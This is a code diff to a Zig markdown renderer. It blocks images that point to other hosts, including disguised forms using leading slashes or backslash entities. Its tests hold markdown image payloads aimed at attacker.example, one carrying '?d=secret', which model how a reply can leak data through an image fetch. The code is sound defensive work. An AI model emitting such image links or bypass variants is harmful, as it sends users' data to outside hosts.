@@ -277,6 +277,20 @@ const heading_close = [_][]const u8{ "</h1>\n", "</h2>\n", "</h3>\n", "</h4>\n",
 /// What an attribute of the page carries: text billy writes, a link, or an image the page fetches.
 const Attribute = enum { text, link, image };
 
+/// Whether `url` opens with the two slashes that make it another host's address, which a browser
+/// reads from `/`, `\` or either twice.
+fn namesAnotherHost(url: []const u8) bool {
+    var at: usize = 0;
+    while (at < url.len and (url[at] <= ' ' or url[at] == 0x7f)) at += 1;
+
+    var slashes: usize = 0;
+    while (at < url.len and (url[at] == '/' or url[at] == '\\')) : (at += 1) {
+        slashes += 1;
+        if (slashes == 2) return true;
+    }
+    return false;
+}
+
 /// Whether an attribute may carry `url`. An image is the one a page fetches as it draws, so it may
 /// only be a data: picture or one this page serves: anything else is a request the user never sees,
 /// which is how a reply sends what it has just read to a host of its own.
@@ -286,11 +300,10 @@ fn safeAddress(url: []const u8, kind: Attribute) bool {
 
     if (kind == .image) {
         if (std.mem.eql(u8, scheme, "data:")) return true;
-        // A name with no scheme is this page's own, unless it names another host in disguise.
         if (std.mem.endsWith(u8, scheme, ":")) return false;
-        var at: usize = 0;
-        while (at < url.len and (url[at] <= ' ' or url[at] == 0x7f)) at += 1;
-        return !std.mem.startsWith(u8, url[at..], "//");
+        // A name with no scheme is this page's own, unless it names another host in disguise: two
+        // slashes at the front are one, and a browser counts a backslash as a slash here.
+        return !namesAnotherHost(url);
     }
 
     for ([_][]const u8{ "javascript:", "vbscript:", "data:" }) |refused| {
@@ -527,6 +540,11 @@ test "an image from another host is not drawn" {
     try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a](https://attacker.example/p.png?d=secret)\n");
     try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a](//attacker.example/p.png)\n");
     try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a]( //attacker.example/p.png)\n");
+    // A browser reads a backslash as a slash here, so a pair of them names another host; markdown
+    // spells them as entities, which are decoded before the address is checked.
+    try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a](&#92;&#92;attacker.example/p.png)\n");
+    try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a](&#92;/attacker.example/p.png)\n");
+    try expectMarkdown("<p><img src=\"#\" alt=\"a\"></p>\n", "![a](&#92;\\/attacker.example/p.png)\n");
 
     // One this page serves is drawn, which is what a reply that drew a diagram here means.
     try expectMarkdown("<p><img src=\"/p.png\" alt=\"a\"></p>\n", "![a](/p.png)\n");
